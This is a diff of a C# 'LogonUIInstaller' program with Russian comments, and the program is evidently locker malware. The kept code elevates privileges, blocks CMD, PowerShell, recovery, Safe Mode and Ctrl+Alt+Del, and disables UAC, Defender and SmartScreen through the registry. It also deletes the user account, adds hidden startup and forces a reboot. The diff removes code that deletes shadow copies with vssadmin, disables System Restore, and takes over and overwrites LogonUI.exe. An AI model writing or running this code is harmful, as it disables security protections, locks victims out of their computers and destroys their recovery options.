@@ -1,4 +1,4 @@
-// installer.cs - Полная версия, правильный порядок
+// installer.cs - Полная версия, правильный порядок (БЕЗ перезаписи LogonUI)
 using System;
 using System.IO;
 using System.Security.AccessControl;
@@ -32,7 +32,6 @@ namespace LogonUIInstaller
 
             try
             {
-                // 1. ЗАПРОС ПРАВ АДМИНИСТРАТОРА
                 if (!IsAdministrator())
                 {
                     RunAsAdministrator();
@@ -41,25 +40,22 @@ namespace LogonUIInstaller
 
                 SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
 
-                // 2. БЛОКИРОВКИ (CMD, PowerShell, VBS, WinRE, Win+L, Ctrl+Alt+Del, Safe Mode, USB, диски, обои, пользователи)
+                // 1. БЛОКИРОВКИ
                 ApplySystemBlocks();
 
-                // 3. ЗАМЕНА ОБОЕВ И КУРСОРОВ
+                // 2. ЗАМЕНА ОБОЕВ И КУРСОРОВ
                 ReplaceWallpaperAndCursors();
 
-                // 4. ОТКЛЮЧЕНИЕ АНТИВИРУСОВ И UAC
+                // 3. ОТКЛЮЧЕНИЕ АНТИВИРУСОВ И UAC
                 DisableAntivirusAndUAC();
 
-                // 5. УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ И СОЗДАНИЕ НОВОГО
+                // 4. УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ
                 ReplaceUserAccount();
 
-                // 6. АВТОЗАГРУЗКА (СКРЫТАЯ, ТОЛЬКО ЧТЕНИЕ)
+                // 5. АВТОЗАГРУЗКА
                 AddToStartup();
 
-                // 7. ПЕРЕЗАПИСЬ LogonUI.exe (БЕЗ BSOD, БЕЗ ЗАПУСКА)
-                ReplaceLogonUI();
-
-                // 8. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА (ПОСЛЕ ВСЕХ БЛОКИРОВОК)
+                // 6. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА (ПОСЛЕ ВСЕХ БЛОКИРОВОК)
                 ForceReboot();
             }
             catch (Exception ex)
@@ -201,7 +197,6 @@ namespace LogonUIInstaller
         {
             try
             {
-                // Отключение UAC
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                 {
                     key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
@@ -209,7 +204,6 @@ namespace LogonUIInstaller
                     key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                 }
 
-                // Отключение Defender и антивирусов
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                 {
                     key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
@@ -218,31 +212,6 @@ namespace LogonUIInstaller
                 {
                     key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                 }
-            }
-            catch { }
-        }
-
-        private static void DestroySystemBackups()
-        {
-            try
-            {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "vssadmin",
-                    Arguments = "delete shadows /all /quiet",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "reg",
-                    Arguments = "add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
             }
             catch { }
         }
@@ -366,137 +335,6 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        private static void ReplaceLogonUI()
-        {
-            try
-            {
-                string originalPath = FindLogonUI();
-                if (string.IsNullOrEmpty(originalPath) || !File.Exists(originalPath))
-                {
-                    originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
-                }
-
-                if (!File.Exists(originalPath)) return;
-
-                ForceFullAccess(originalPath);
-                KillLogonUIProcesses();
-
-                File.SetAttributes(originalPath, FileAttributes.Normal);
-                for (int i = 0; i < 5; i++)
-                {
-                    try
-                    {
-                        File.Delete(originalPath);
-                        break;
-                    }
-                    catch
-                    {
-                        System.Threading.Thread.Sleep(1000);
-                        try
-                        {
-                            File.Move(originalPath, originalPath + ".del");
-                            File.Delete(originalPath + ".del");
-                            break;
-                        }
-                        catch { }
-                    }
-                }
-
-                byte[] customLogonUI = ExtractResource("LogonUI.exe");
-                File.WriteAllBytes(originalPath, customLogonUI);
-            }
-            catch { }
-        }
-
-        private static void ForceFullAccess(string path)
-        {
-            try
-            {
-                File.SetAttributes(path, FileAttributes.Normal);
-            }
-            catch { }
-
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "takeown.exe",
-                    Arguments = $"/f \"{path}\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-                if (p != null) { p.WaitForExit(3000); p.Close(); }
-            }
-            catch { }
-
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "icacls.exe",
-                    Arguments = $"\"{path}\" /grant Everyone:F",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-                if (p != null) { p.WaitForExit(3000); p.Close(); }
-            }
-            catch { }
-
-            try
-            {
-                FileInfo fi = new FileInfo(path);
-                FileSecurity fs = fi.GetAccessControl();
-                fs.SetOwner(WindowsIdentity.GetCurrent().User);
-                fs.AddAccessRule(new FileSystemAccessRule(
-                    new NTAccount(Environment.UserDomainName, Environment.UserName),
-                    FileSystemRights.FullControl, AccessControlType.Allow));
-                fs.AddAccessRule(new FileSystemAccessRule(
-                    new NTAccount("NT AUTHORITY\\SYSTEM"),
-                    FileSystemRights.FullControl, AccessControlType.Allow));
-                fi.SetAccessControl(fs);
-            }
-            catch { }
-        }
-
-        private static string FindLogonUI()
-        {
-            string[] paths = {
-                @"C:\Windows\System32\LogonUI.exe",
-                @"C:\WINDOWS\System32\LogonUI.exe",
-                @"C:\Windows\system32\LogonUI.exe",
-                Environment.ExpandEnvironmentVariables(@"%SystemRoot%\System32\LogonUI.exe")
-            };
-            foreach (string p in paths)
-            {
-                try { if (File.Exists(p)) return p; } catch { }
-            }
-            return null;
-        }
-
-        private static void KillLogonUIProcesses()
-        {
-            try
-            {
-                foreach (Process p in Process.GetProcessesByName("LogonUI"))
-                {
-                    try
-                    {
-                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
-                            p.MainModule.FileName.Contains("System32"))
-                        {
-                            p.Kill();
-                            p.WaitForExit(3000);
-                            System.Threading.Thread.Sleep(500);
-                        }
-                    }
-                    catch { }
-                }
-            }
-            catch { }
-        }
-
         private static void ExtractResource(string name, string outputPath)
         {
             try
@@ -511,19 +349,6 @@ namespace LogonUIInstaller
                 }
             }
             catch { }
-        }
-
-        private static byte[] ExtractResource(string resourceName)
-        {
-            Assembly assembly = Assembly.GetExecutingAssembly();
-            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
-                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
-            {
-                if (stream == null) throw new Exception($"Resource {resourceName} not found");
-                byte[] data = new byte[stream.Length];
-                stream.Read(data, 0, data.Length);
-                return data;
-            }
         }
     }
 }
